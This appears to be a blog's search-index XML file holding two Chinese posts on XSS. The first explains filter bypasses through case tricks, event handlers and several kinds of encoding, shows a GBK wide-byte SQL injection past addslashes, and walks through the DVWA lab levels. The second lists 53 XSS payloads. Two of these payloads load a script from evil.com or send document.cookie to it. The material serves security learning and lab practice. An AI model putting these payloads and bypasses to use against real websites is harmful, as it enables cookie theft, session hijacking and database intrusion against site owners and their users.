<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2018%2F11%2F30%2FXSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最基本的用法：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; ##大小写及重写的绕过：## &lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt; ##事件绕过：## 利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt; ###相关JS事件：### ##编码绕过：## 当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段 例如：&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 上述代码解析后为：&lt;img src=1 onerror=alert(1)&gt; ,可以弹窗 在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt; 解码后为&lt;script&gt;alert(1)&lt;/script&gt;,一样可以弹窗。但如果是：&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt; 解码后为 &lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;就不要指望他可以弹窗了。因为解码出来的&#39;);alert(&#39;111仍为被当作字符串而不会影响上下文。 利用String.fromCharCode进行编码绕过测试代码： &lt;?php function xss_check($str){ if(preg_match(&apos;/script|alert/i&apos;, $str)) return &apos;error&apos;; else return $str; } @$id = $_GET[&apos;id&apos;]; echo xss_check($id); ?&gt; 屏蔽了alert(也可能是其他的)，此时可以使用编码绕过： &lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt; 将javascript和alert进行unicode编码实现绕过，成功弹窗。 ####利用String.fromCharCode进行编码绕过:#### &lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt; 其中String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)是alert(/xss/)编码后的内容，google插件hackbar就有此功能。 ##GBK宽字节绕过## 测试代码： &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt; &lt;?php error_reporting(0); $conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn); #mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;; if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row); } }else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;; } ?&gt; 直接‘会被转义，不会被执行。 使用宽字符就可以被成功执行 ###解析过程### $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘，而%27、%20小于ascii(128)的字符就保留了。 ##IE6下绕过## IE下还可利用javascript:alert(/xss/); 或css body { background:black; xss:expression(alert(/zhuling.wang/));/*IE6下测试*/ } 成功绕过 ##DVWA测试用例## ###反射性XSS### ####低等级#### 任意XSS都可用 ####中等级#### &lt;script &gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;img src=# onerror=alert(1)&gt; &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等 ####高等级####过滤掉script标签更严格，不能使用script标签 &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt; &lt;img src=# onerror=alert(1)&gt; 其他html标签构造的事件还是可以使用的。 ####不可能级别####用到了htmlspecialchars()，这个函数是将预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; （大于）成为 &gt; ###存储型XSS### ####低等级#### 没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。 &lt;img src=# onerror=alert(1)&gt;等等 ####中等级#### 因为一上来就给Message添加了htmlspecialchars函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。或者可以用burp抓包发送。 ####高等级#### message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。 ####不可能级别####这里对name和message都做了htmlspecialchars（）处理。 ###DOM型XSS### ####低等级#### 直接在网页导航栏构造GET XSS即可完成注入 ####中等级#### 源码显示会过滤掉script标签，但是直接用&lt;img src=# onerror=alert(1)&gt;没有直接执行，尝试闭合option没有成功,尝试闭合select标签成功执行。 ?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;也可以。 ####高等级#### 对传入值进行switch判断 ?default=English #&lt;script&gt;alert(1)&lt;/script&gt; #该字符后的数据不会发送到服务器端，从而绕过服务端过滤。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F11%2F30%2FXSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1.&lt;script&gt; alert(1);&lt;/script&gt; 2.&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 3.&lt;script src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt; 4.&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt; 5.&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt; 6.&lt;img src=liu.jpg onerror=alert(/xss/)/&gt; 7.&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt; 8.&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt; 9.&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt; 10.&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt; 11.&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 12.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 13.&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt; 14.&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 15.&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt; 16.&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 17.&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 18.&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt; 19.&#39;);alert(&#39;XSS 20.&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt; 21.[url=javascript:alert(&#39;XSS&#39;);]click me[/url] 22.&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 23.&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot; 24.[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color] 25.&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt; 26.window.alert(&quot;XSS&quot;); 27.&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt; 28.&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt; 29.&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;30.&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt; 31.&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 32.&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt; 33.&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 34.&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 35.&lt;script&gt;var var=1; alert(var)&lt;/script&gt; 36.&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; 37.&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt; 38.&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt; 39.&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot; 40.&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt; 41.&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS 42.&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt; 43.&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 44.&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; 45.[color=red width=expression(alert(123))][color] 46.&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; 47.Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt; 48.&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt; 49.&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt; 50.&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt; 51.&lt;div style=&quot;background:url(&#39;javascript:&#39;) 52.&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt; 53.&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;]]></content>
  </entry>
</search>
